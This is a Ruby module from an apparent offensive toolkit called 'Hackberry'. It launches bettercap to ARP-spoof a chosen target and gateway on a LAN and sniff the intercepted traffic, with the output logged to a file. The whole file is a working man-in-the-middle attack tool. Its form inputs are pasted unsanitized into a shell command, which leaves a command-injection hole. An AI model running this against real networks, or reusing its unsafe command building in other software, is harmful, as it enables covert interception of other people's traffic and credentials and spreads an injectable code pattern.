# modules/network/mitm_bettercap.rb
require_relative '../../core/module_base'
require_relative '../../core/exec'
require_relative '../../core/registry'

module Hackberry
  class BettercapMITM < ModuleBase
    def self.id; 'net_bettercap_mitm'; end
    def self.category; :network; end
    def self.label; 'Bettercap MITM (ARP)'; end
    def self.icon; '🌐'; end

    def self.actions
      [
        {
          id:'mitm', label:'Start ARP Spoof', description:'Gateway‑target MITM',
          inputs:[
            {name:'iface', label:'LAN iface', type:'text', placeholder:'eth0'},
            {name:'gw', label:'Gateway IP', type:'text', placeholder:'192.168.1.1'},
            {name:'target', label:'Target IP/CIDR', type:'text', placeholder:'192.168.1.50'}
          ]
        }
      ]
    end

    def self.run(action_id, p, cfg)
      iface = p['iface'] || cfg['interfaces']['lan']
      gw = p['gw'] || '192.168.1.1'
      target = p['target'] || '192.168.1.50'
      log = File.join(cfg['paths']['logs'], "bettercap-mitm-#{Hackberry::Exec.timestamp}.log")
      caplet = %(set net.probe on; set arp.spoof.targets #{target}; set arp.spoof.fullduplex true; set net.sniff.verbose true; set net.sniff.local true; set net.sniff.filter 'host #{target}'; set net.recon on; set net.gateway #{gw}; set iface #{iface}; arp.spoof on; net.sniff on; events.stream on;)
      cmd = "bettercap -iface #{iface} -eval \"#{caplet}\""
      Hackberry::Exec.tmux_run(name:'bcap-mitm', cmd: cmd, log_path: log)
    end
  end
end

Hackberry::Registry.register(Hackberry::BettercapMITM)
